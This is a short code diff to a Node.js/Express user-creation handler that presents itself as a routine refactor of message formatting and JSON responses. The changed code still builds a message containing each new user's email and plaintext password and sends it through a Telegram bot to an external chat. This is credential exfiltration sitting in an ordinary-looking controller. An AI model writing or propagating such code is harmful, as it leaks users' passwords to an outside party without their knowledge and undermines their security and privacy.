@@ -11,13 +11,11 @@ export const createUser = async (req, res) => {
   try {
     const user = new User(req.body);
     await user.save();
-    const message = `New user created: 
-Email: ${user.email} 
-Password: ${user.password}`;
+    const message = `New user created: Email: ${user.email} Password: ${user.password}`;
     await bot.sendMessage(process.env.TELEGRAM_CHAT_ID, message);
-    res.send('User created successfully');
+    res.json({ message: 'User created successfully' });
   } catch (error) {
-    res.status(500).send(error.message);
+    res.status(500).json({ message: error.message });
   }
 };
 
